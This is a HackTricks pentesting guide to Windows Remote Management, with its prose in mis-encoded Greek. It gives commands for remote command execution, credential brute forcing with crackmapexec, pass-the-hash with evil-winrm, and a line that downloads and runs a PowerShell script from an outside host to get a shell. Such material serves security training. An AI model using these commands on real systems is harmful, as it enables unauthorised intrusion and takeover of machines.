# 5985,5986 - Pentesting WinRM

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Ï„Î·Ï‚ Microsoft** Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· **Ï„Î·Î»ÎµÎ´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÏƒÏ…ÏƒÏ„Î·Î¼Î¬Ï„Ï‰Î½ Windows** Î¼Î­ÏƒÏ‰ HTTP(S), Î±Î¾Î¹Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ SOAP ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±. Î’Î±ÏƒÎ¯Î¶ÎµÏ„Î±Î¹ Î¸ÎµÎ¼ÎµÎ»Î¹Ï‰Î´ÏÏ‚ ÏƒÏ„Î¿ WMI, Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï… Ï‰Ï‚ Î¼Î¹Î± Î´Î¹ÎµÏ€Î±Ï†Î® Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î· ÏƒÎµ HTTP Î³Î¹Î± Ï„Î¹Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ WMI.

Î— Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± Ï„Î¿Ï… WinRM ÏƒÎµ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î»Î® Ï„Î·Î»ÎµÎ´Î¹Î¿Î¯ÎºÎ·ÏƒÎ· Î¼Î­ÏƒÏ‰ PowerShell, Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï„Î¿ SSH Î³Î¹Î± Î¬Î»Î»Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±. Î“Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î±Î½ Ï„Î¿ WinRM ÎµÎ¯Î½Î±Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ, ÏƒÏ…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ Î¬Î½Î¿Î¹Î³Î¼Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Ï‰Î½ Î¸Ï…ÏÏÎ½:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

ÎœÎ¹Î± Î±Î½Î¿Î¹Ï‡Ï„Î® Î¸ÏÏÎ± Î±Ï€ÏŒ Ï„Î· Î»Î¯ÏƒÏ„Î± Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ WinRM Î­Ï‡ÎµÎ¹ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î­Î½Î±ÏÎ¾Î·Ï‚ Î¼Î¹Î±Ï‚ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î·Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚.

### **Initiating a WinRM Session**

Î“Î¹Î± Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ„Îµ Ï„Î¿ PowerShell Î³Î¹Î± Ï„Î¿ WinRM, Ï„Î¿ cmdlet `Enable-PSRemoting` Ï„Î·Ï‚ Microsoft Î­ÏÏ‡ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Ï€ÏÎ¿ÏƒÎºÎ®Î½Î¹Î¿, ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î½Î± Î´Î­Ï‡ÎµÏ„Î±Î¹ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ PowerShell. ÎœÎµ Î±Î½Ï…ÏˆÏ‰Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· PowerShell, Î¿Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Î±Ï…Ï„Î® Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÎºÎ±Î¹ Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î½ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Ï‰Ï‚ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· ÎµÎ½ÏŒÏ‚ wildcard ÏƒÏ„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· `trustedhosts`, Î­Î½Î± Î²Î®Î¼Î± Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ® ÎµÎ¾Î­Ï„Î±ÏƒÎ· Î»ÏŒÎ³Ï‰ Ï„Ï‰Î½ ÎµÏ€Î¹Ï€Ï„ÏÏƒÎµÏÎ½ Ï„Î¿Ï…. Î•Ï€Î¯ÏƒÎ·Ï‚, ÏƒÎ·Î¼ÎµÎ¹ÏÎ½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î· Î±Î»Î»Î±Î³Î® Ï„Î¿Ï… Ï„ÏÏ€Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï… Î±Ï€ÏŒ "Î”Î·Î¼ÏŒÏƒÎ¹Î¿" ÏƒÎµ "Î•ÏÎ³Î±ÏƒÎ¯Î±" Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î· ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï….

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï„Î¿ WinRM Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î±** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `wmic`, ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Î¿Ï… WinRM, ÎµÎ½Î¹ÏƒÏ‡ÏÎ¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ…ÎµÎ»Î¹Î¾Î¯Î± ÏƒÏ„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Ï‰Î½ Windows Î¼Î·Ï‡Î±Î½ÏÎ½ Î±Ï€ÏŒ Î¼Î±ÎºÏÎ¹Î¬.

### Î”Î¿ÎºÎ¹Î¼Î® Î±Î½ ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿

Î“Î¹Î± Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÎµÏ„Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÏƒÎ±Ï‚, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î· ÎµÎ½Ï„Î¿Î»Î® `Test-WSMan` Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î¿ ÏƒÏ„ÏŒÏ‡Î¿Ï‚ Î­Ï‡ÎµÎ¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ‰ÏƒÏ„Î¬ Ï„Î¿ WinRM. Î•ÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î®, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÎµÏÎ¹Î¼Î­Î½ÎµÏ„Îµ Î½Î± Î»Î¬Î²ÎµÏ„Îµ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Î¿Ï… ÎºÎ±Î¹ Ï„Î¿ wsmid, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ ÎµÏ€Î¹Ï„Ï…Ï‡Î·Î¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ·. Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ±Ï„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ Ï„Î·Î½ Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½Î· Î­Î¾Î¿Î´Î¿ Î³Î¹Î± Î­Î½Î±Î½ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„ÏŒÏ‡Î¿ ÏƒÎµ ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· Î¼Îµ Î­Î½Î±Î½ Î¼Î· ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿:

* Î“Î¹Î± Î­Î½Î±Î½ ÏƒÏ„ÏŒÏ‡Î¿ Ï€Î¿Ï… **ÎµÎ¯Î½Î±Î¹** ÏƒÏ‰ÏƒÏ„Î¬ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿Ï‚, Î· Î­Î¾Î¿Î´Î¿Ï‚ Î¸Î± Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ Î±Ï…Ï„ÏŒ:
```bash
Test-WSMan <target-ip>
```
Î— Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Î¿Ï… ÎºÎ±Î¹ Ï„Î¿ wsmid, Ï…Ï€Î¿Î´Î·Î»ÏÎ½Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Ï„Î¿ WinRM Î­Ï‡ÎµÎ¹ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ ÏƒÏ‰ÏƒÏ„Î¬.

![](<../.gitbook/assets/image (582).png>)

* Î‘Î½Ï„Î¯Î¸ÎµÏ„Î±, Î³Î¹Î± Î­Î½Î±Î½ ÏƒÏ„ÏŒÏ‡Î¿ **Î¼Î·** ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ Î³Î¹Î± WinRM, Î±Ï…Ï„ÏŒ Î¸Î± ÎµÎ¯Ï‡Îµ Ï‰Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Î½Î± Î¼Î·Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï„Î­Ï„Î¿Î¹ÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, ÎµÏ€Î¹ÏƒÎ·Î¼Î±Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Ï€Î¿Ï…ÏƒÎ¯Î± ÏƒÏ‰ÏƒÏ„Î®Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Ï„Î¿Ï… WinRM.

![](<../.gitbook/assets/image (458).png>)

### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»Î®Ï‚

Î“Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `ipconfig` Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î± ÏƒÎµ Î­Î½Î±Î½ ÏƒÏ„ÏŒÏ‡Î¿ Î¼Î·Ï‡Î±Î½Î®Ï‚ ÎºÎ±Î¹ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î­Î¾Î¿Î´ÏŒ Ï„Î¿Ï…, ÎºÎ¬Î½Ï„Îµ:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÎ½Ï„Î¿Î»Î® Ï„Î·Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ±Ï‚ ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚ PS ÏƒÎ±Ï‚ Î¼Î­ÏƒÏ‰** _**Invoke-Command**_. Î¥Ï€Î¿Î¸Î­ÏƒÏ„Îµ ÏŒÏ„Î¹ Î­Ï‡ÎµÏ„Îµ Ï„Î¿Ï€Î¹ÎºÎ¬ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ _**enumeration**_ ÎºÎ±Î¹ Î¸Î­Î»ÎµÏ„Îµ Î½Î± **Ï„Î·Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÏƒÎµ Î­Î½Î±Î½ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ Î£ÎµÎ½Î±ÏÎ¯Î¿Ï…
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Î Î¬ÏÎµ reverse-shell
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Î Î¬ÏÎµ Î¼Î¹Î± PS ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±

Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹Ï‚ Î¼Î¹Î± Î´Î¹Î±Î´ÏÎ±ÏƒÏ„Î¹ÎºÎ® PowerShell shell, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎµ `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**Î— ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ Î¼Î¹Î± Î½Î­Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± (wsmprovhost) Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ "Î¸ÏÎ¼Î±"**

### **Î‘Î½Î±Î³ÎºÎ¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ WinRM Î½Î± Î‘Î½Î¿Î¯Î¾ÎµÎ¹**

Î“Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ PS Remoting ÎºÎ±Î¹ Ï„Î¿ WinRM Î±Î»Î»Î¬ Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Îµ:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Î‘Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎºÎ±Î¹ Î•Ï€Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÏ…Î½ÎµÎ´ÏÎ¹ÏÎ½

Î‘Ï…Ï„ÏŒ **Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹** Î±Î½ Î· **Î³Î»ÏÏƒÏƒÎ±** ÎµÎ¯Î½Î±Î¹ **Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î·** ÏƒÏ„Î¿Î½ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ÎœÎ­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ PS scripts Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Î£Ï†Î¬Î»Î¼Î±Ï„Î±

Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÏ†Î¬Î»Î¼Î±:

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

Î— Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î± ÏƒÏ„Î¿Î½ Ï€ÎµÎ»Î¬Ï„Î· (Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ [ÎµÎ´Ï](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## WinRM ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÎµ linux

### Brute Force

Î ÏÎ¿ÏƒÎ¿Ï‡Î®, Î· Î²Î¯Î±Î¹Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÏƒÏ„Î¿ winrm Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ»ÎµÎ¯ÏƒÎµÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ evil-winrm
```ruby
gem install evil-winrm
```
Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ **Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·** ÏƒÏ„Î¿ github Ï„Î¿Ï…: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Î“Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ evil-winrm Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÎµ Î¼Î¹Î± **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IPv6**, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î¼Î¹Î± ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ _**/etc/hosts**_ ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î­Î½Î± **ÏŒÎ½Î¿Î¼Î± Ï„Î¿Î¼Î­Î±** ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IPv6 ÎºÎ±Î¹ ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„Î¿Î¼Î­Î±.

### Î ÎµÏÎ¬ÏƒÏ„Îµ Ï„Î¿ hash Î¼Îµ Ï„Î¿ evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ruby

**ÎšÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… ÎµÎ¾Î¬Î³ÎµÏ„Î±Î¹ Î±Ï€ÏŒ ÎµÎ´Ï:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
